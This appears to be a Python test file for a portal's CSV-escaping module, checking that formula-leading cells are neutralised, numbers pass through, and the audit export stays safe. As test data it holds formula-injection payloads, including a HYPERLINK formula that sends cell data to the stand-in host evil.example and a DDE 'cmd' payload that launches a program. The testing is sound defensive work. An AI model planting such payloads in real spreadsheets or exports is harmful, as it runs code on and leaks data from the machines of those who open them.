#!/usr/bin/env python3
"""A name somebody typed cannot become a formula in the exported CSV.

Every CSV this portal exports is built from operator text — an asset's
hostname, a subscription's vendor, an audit line's target. A spreadsheet runs a
cell beginning `=`, `+`, `-` or `@` as a FORMULA, so `=HYPERLINK(...)` stored
as a name is code that executes on the machine of whoever opens the export.
CWE-1236, and the export most likely to be opened by somebody senior is the
audit log, which exists to be handed to an auditor.

Found by semgrep's `csv-writer-injection` at six export sites, none of which
escaped anything. Two halves are checked here and the SECOND is the load-bearing
one:

  * the escaping works, and leaves a negative number alone;
  * NO module writes a raw `csv.writer` any more -- which is what catches the
    seventh export, written next year by somebody who never read this file.

    PORTAL_DATA_DIR=$(mktemp -d) ./.venv/bin/python tests/test_csvsafe.py
"""
from __future__ import annotations

import io
import os
import pathlib
import re
import sys
import time

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))
import _sandbox                                                # noqa: E402
os.environ["PORTAL_DATA_DIR"] = _sandbox.data_dir("csvsafe-test-")
os.environ["PORTAL_SCHEDULER"] = "0"
ROOT = pathlib.Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from app import csvsafe                                        # noqa: E402

bad = 0


def check(what: str, cond: bool) -> None:
    global bad
    if not cond:
        bad += 1
        print(f"  FAIL {what}")
    else:
        print(f"  ok  {what}")


ATTACK = '=HYPERLINK("http://evil.example/"&A1,"click me")'


def main() -> int:
    print("a formula is neutralised")
    for payload in (ATTACK, "@SUM(A1:A9)", "+1+1", "-alpha", "=cmd|'/c calc'!A0",
                    "\t=1+1", "\r=1+1"):
        got = csvsafe.cell(payload)
        check(f"{payload[:24]!r} is quoted", got.startswith("'"))

    print("...but a NUMBER is not, or a finance column stops adding up")
    # This is the reason `cell` tries float() instead of matching a pattern:
    # a spend export's negative amounts and a metric's scientific notation
    # are values somebody sums, and quoting them turns the column into text.
    for num in ("-12.50", "+3", "-1e6", "-0", "+.5"):
        check(f"{num!r} passes through", csvsafe.cell(num) == num)
    check("a plain word passes through", csvsafe.cell("hostname") == "hostname")
    check("an int is untouched", csvsafe.cell(42) == 42)
    check("None is untouched", csvsafe.cell(None) is None)
    check("empty is untouched", csvsafe.cell("") == "")

    print("the writer escapes every cell of every row")
    buf = io.StringIO()
    w = csvsafe.writer(buf)
    w.writerow(["head", "n"])
    w.writerows([[ATTACK, "-1.5"], ["ok", "2"]])
    out = buf.getvalue()
    check("writerows is covered as well as writerow",
          out.count("'=HYPERLINK") == 1)
    check("...and the number in the same row survives", ",-1.5\r\n" in out)

    # ── the half that catches the export nobody has written yet ──────────
    print("NO module writes a raw csv.writer")
    offenders = []
    for py in sorted((ROOT / "app").glob("*.py")):
        if py.name == "csvsafe.py":
            continue                    # the one legitimate wrapper
        # Comments are stripped first: a comment explaining WHY the raw
        # writer is not used names it, and an un-stripped read fails a
        # correct implementation -- the mirror image of a test its own
        # documentation can satisfy.
        body = "\n".join(re.sub(r"#.*$", "", ln)
                         for ln in py.read_text().splitlines())
        if "csv.writer(" in body:
            offenders.append(py.name)
    check(f"none found (checked {len(list((ROOT / 'app').glob('*.py')))} modules)",
          not offenders)
    if offenders:
        print(f"       {', '.join(offenders)} -- use csvsafe.writer")

    print("through the HTTP stack, on the export an auditor reads")
    from fastapi.testclient import TestClient
    from app import auth, db, main
    email, pw = "csv@test.local", "Formulas-Do-Not-Run-42"
    uid = auth.create_user(email, "CI", pw, role="admin")
    db.run("UPDATE users SET mfa_enrolled=1, totp_secret=? WHERE id=?",
           ("TESTSECRET", uid))
    c = TestClient(main.app)
    with c:
        c.post("/login", data={"email": email, "password": pw},
               follow_redirects=False)
        c.post("/mfa", data={"code": auth._totp_at(
            "TESTSECRET", int(time.time() // auth.TOTP_STEP))},
            follow_redirects=False)

        # The audit log is the worst case: it is built from operator text and
        # it is the file handed to somebody outside the team.
        # audit() takes the user DICT and swallows a write failure, so
        # passing a bare email writes nothing and the export is simply
        # empty -- which is why the "payload is in it" check below is
        # not redundant with the escaping check beside it.
        auth.audit({"email": email}, "csvsafe_probe", ATTACK,
                   "a target somebody named")
        r = c.get("/admin/audit/export")
        check("the audit export downloads", r.status_code == 200)
        check("the payload is in it (the row was not dropped)",
              "HYPERLINK" in r.text)
        check("...and it is NOT a live formula",
              "=HYPERLINK" not in r.text.replace("'=HYPERLINK", ""))

        r = c.get("/assets/export.csv")
        check("the asset export downloads too", r.status_code == 200)

    print("OK" if not bad else f"{bad} FAILED")
    return 1 if bad else 0


if __name__ == "__main__":
    sys.exit(main())
